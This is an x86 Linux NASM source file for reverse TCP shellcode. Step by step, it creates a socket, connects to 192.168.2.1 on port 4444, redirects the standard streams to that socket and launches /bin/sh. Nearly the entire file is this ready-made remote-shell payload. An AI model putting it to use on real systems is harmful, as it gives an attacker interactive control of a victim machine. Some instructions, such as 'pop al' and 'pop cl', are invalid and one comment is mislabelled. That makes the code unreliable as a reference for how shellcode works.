;    shellcode_reverse_tcp.nasm - Generate the shellcode with the correct port in
;    Copyright (C) 2013 dummys  - http://www.twitter.com/dummys1337
;
;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.
;


global _start			

section .text
_start:



	; create_socket
	
	;null the edx
	cdq
	
	; syscall 102 in eax
	push byte 0x66
 	pop al
 	
	; 1 in ebx for type of socketcall
	xor ebx, ebx
	inc ebx
 
	; Build the array of arg
	; push 0 for protocol
	push edx
	; push 0x1 for sock_stream
	push byte 0x1
	; push 0x2 for af_inet
	push byte 0x2

	; save pointer of arg array in ecx
	mov ecx, esp

	; call interrupt
 	int 0x80

	; save the socket file descriptor in esi
	mov esi, eax



	; socket_connect
	; mov socket syscall number in eax
	push byte 0x66
	pop al

	; increment ebx for AF_INET
	inc ebx
	
	; Build the array of arg
	push edx
	; Push the ip address 192.168.2.1 in reverse order
	push dword 0x0102a8c0
	; Push the port 4444 in reverse order
	push word 0x5c11
	; Push 0x2 for type
	push word bx
	
	; save pointer of arg array in ecx
	mov ecx, esp

 	; Push the sizeof arg array
	push byte 16
	
	; Push the struct pointer
	push ecx
	
	; Push the socket file descriptor
	push esi
	
	; Mov in ecx the pointer of argument array
	mov ecx, esp

	; Increment ebx for connect	
	inc ebx

	; Call interrupt
	int 0x80



	
	; Dup2 syscall template
	; mov the socket file descriptor in ebx
	xchg esi, ebx
	
	; Set 2 in ecx
	push byte 0x2
	pop cl
	
	; Dup2 loop instructions
	dup_loop:
  		; mov the syscall number 63 in al
		mov byte al, 0x3f
  		
		; Interrupt
		int 0x80
		
		; Decrement ecx
		dec ecx
		
		; If the sign flag is not set, ecx is not neg
		jns dup_loop



	; Execve syscall for shell
	; Push the null terminated for strings args
	push edx

	; Push /bin/sh in reverse order
	push 0x68732f2f
	push 0x6e69622f

	; Save pointer of arg array in ebx
	mov ebx, esp

	;push null terminated for env
	push edx
	
	; saving null in edx
	mov edx, esp

	; Push pointer of /bin/sh on the stack
	push ebx
	
	; Save pointer in the ecx
	mov ecx, esp

	; mov 0xb 11 for execve syscall	
	mov byte al, 0xb
	
	; Interrupt
	int 0x80
